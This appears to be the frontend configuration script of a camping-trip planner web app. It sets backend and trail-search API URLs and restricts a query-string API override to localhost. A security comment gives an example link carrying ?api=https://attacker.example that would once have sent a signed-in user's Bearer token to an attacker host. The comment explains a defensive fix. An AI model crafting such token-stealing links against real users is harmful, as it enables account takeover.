// Single source of truth for the two API base URLs the frontend talks to:
// window.API_URL (the Render backend) and window.TRAILS_API_URL (the Cloudflare
// Worker's /api/nearby-trails, which powers Discover).
// Loaded before every other script so both are always defined.
(function () {
  if (window.__trailpackConfigLoaded) return;
  window.__trailpackConfigLoaded = true;

  const host = window.location.hostname;
  const isLocalhost = host === 'localhost' || host === '127.0.0.1' || host === '';

  // Override via <meta name="trailpack-api" content="https://..."> for debugging.
  // Setting the meta tag means editing the served HTML, which you can only do
  // if you already control the page.
  const metaOverride = document.querySelector('meta[name="trailpack-api"]')?.content;

  // SECURITY: ?api= is honoured on localhost only.
  //
  // It used to apply everywhere, and app.js attaches the session token to every
  // request it sends to window.API_URL. So a link like
  //
  //   https://mytrailpack.netlify.app/dashboard.html?api=https://attacker.example
  //
  // sent to a signed-in user pointed the whole app at an attacker's host and
  // handed over their Authorization: Bearer token on the first request — an
  // account takeover from one click, with nothing to notice.
  //
  // Local development keeps the escape hatch, where the only token at risk is
  // the developer's own against their own backend.
  const queryOverride = isLocalhost
    ? new URLSearchParams(window.location.search).get('api')
    : null;

  const DEFAULT_LOCAL = 'http://localhost:3000';
  const DEFAULT_PROD = 'https://trailpack-smart-camping-trip-planner-agq7.onrender.com';

  window.API_URL = queryOverride || metaOverride || (isLocalhost ? DEFAULT_LOCAL : DEFAULT_PROD);

  // ---- Trail search (Discover) ----------------------------------------------
  //
  // /api/nearby-trails is a route on the Cloudflare Worker (src/index.js), not
  // on the Render backend. The frontend is now served from two hosts and only
  // one of them has that route:
  //
  //   - Cloudflare Worker   assets + code, so the route is same-origin
  //   - Vercel              static files only, so the route 404s
  //
  // A relative URL is therefore right on one host and wrong on the other. Where
  // the route exists locally we keep using it — same-origin means no CORS and
  // no preflight, and it is the arrangement the Worker's cache was designed
  // around. Everywhere else falls back to the Worker's absolute URL, which
  // answers cross-origin because the route sends Access-Control-Allow-Origin.
  //
  // An empty base is deliberate: it makes the same-origin case a plain relative
  // path, exactly what this code did before there was a second host.
  const WORKER_ORIGIN = 'https://trailpack---smart-camping-trip-planner.shrey30patel.workers.dev';

  // `wrangler dev` serves the route on localhost too, so local development
  // stays same-origin and needs no network round trip to Cloudflare.
  const servesTrailsRoute = isLocalhost || host.endsWith('.workers.dev');

  window.TRAILS_API_URL = servesTrailsRoute ? '' : WORKER_ORIGIN;
})();
